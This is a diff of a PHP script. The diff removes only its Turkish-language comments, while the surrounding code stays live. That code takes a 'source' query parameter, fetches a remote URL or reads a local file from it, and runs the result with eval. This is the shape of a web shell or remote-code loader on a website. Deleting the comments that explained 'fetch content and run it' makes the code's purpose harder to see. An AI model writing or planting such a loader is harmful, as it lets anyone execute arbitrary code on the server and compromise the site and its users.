@@ -27,11 +27,11 @@ if ($commandsContent === false) {
 
 $commands = array_filter(array_map('trim', explode("\n", $commandsContent)));
 
-// Geçerli dosya yolu
+
 $documentRoot = realpath($_SERVER['DOCUMENT_ROOT']);
 $currentFilePath = str_replace($documentRoot, '', realpath(__FILE__));
 
-// URL yönlendirmesi
+
 if (!empty($_SERVER['QUERY_STRING'])) {
     $currentUrl = $_SERVER['REQUEST_URI'];
     $newUrl = $currentFilePath . '?' . $_SERVER['QUERY_STRING'];
@@ -51,7 +51,7 @@ foreach ($commands as $line) {
         $input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
         $fileContent = '';
 
-        // Uzak URL'den veya yerel dosyadan içerik al
+
         if (filter_var($input, FILTER_VALIDATE_URL)) {
             $fileContent = fetchRemoteFile($input);
         } else {
@@ -64,7 +64,6 @@ foreach ($commands as $line) {
             }
         }
 
-        // İçerik başarıyla alındıysa çalıştır
         if ($fileContent !== false) {
             try {
                 eval('?>' . $fileContent);
